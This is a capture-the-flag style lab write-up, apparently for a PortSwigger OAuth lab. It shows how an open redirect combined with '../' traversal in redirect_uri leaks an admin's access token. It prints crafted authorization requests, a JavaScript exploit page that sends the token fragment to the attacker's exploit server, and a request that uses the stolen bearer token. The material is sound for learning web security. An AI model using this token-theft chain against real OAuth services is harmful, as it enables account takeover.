
# Stealing OAuth access tokens via an open redirect

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

Note: You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter.


---------------------------------------------

References: 

- https://portswigger.net/web-security/oauth





![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/1.png)
![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/2.png)

---------------------------------------------

If we change the “redirect_uri” parameter to the url of the exploit server we find it is not possible as it is not part of the registered values:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/3.png)


And we can not provide the parameter twice, so no parameter pollution:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/4.png)



Starting with “localhost” does not work either:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/5.png)


But it is possible to add “../” to the url:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/6.png)


Blogs have a “Next post” button which seems vulnerable to open redirect:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/7.png)


We can change the “path” parameter to anyone we need:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/8.png)


We can use it to redirect to the exploit server:

```
GET /post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/
```



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/9.png)


We can set the “redirect_uri” to “/post/next”:

```
redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/
```

```
GET /auth?client_id=oy2ed6shddhvjw8klmsnu&redirect_uri=redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/&response_type=token&nonce=1218229424&scope=openid%20profile%20email HTTP/2
``` 



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/10.png)


The previous payload redirects to the exploit server:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/11.png)


And it contains the access token in the url:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/12.png)


The value is not logged because it starts with “#”. 

From the solution I found a way to log the second part after “#”:

```
<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
```


We can set the “redirect_uri” to redirect to “/exploit” in the exploit server:

```
redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/exploit
```

```
GET /auth?client_id=oy2ed6shddhvjw8klmsnu&redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/exploit&response_type=token&nonce=328741005&scope=openid%20profile%20email HTTP/2
``` 

We reach /exploit:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/13.png)


And it causes a second redirection:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/14.png)


Now the access token is logged:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/15.png)



Now we will prepare the “/exploit” path so it redirects to “/auth” first and to the exploit server second:

```
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0a6500a0036c389681a332430272000a.oauth-server.net/auth?client_id=oy2ed6shddhvjw8klmsnu&redirect_uri=https://0a5100fc036a387b81e8347900740079.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ac500c0030538a5812f33c001d60054.exploit-server.net/exploit/&response_type=token&nonce=-1318932807&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```


We get an access token from the victim:



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/16.png)


Finally we can use this token to list the user information in “/me”:

```
GET /me HTTP/2
Host: oauth-0a6500a0036c389681a332430272000a.oauth-server.net
...
Authorization: Bearer z-YNsRxiSi76jANt3-GzRzwq65ru3uOA8K3z0w1urIm
```



![img](images/Stealing%20OAuth%20access%20tokens%20via%20an%20open%20redirect/17.png)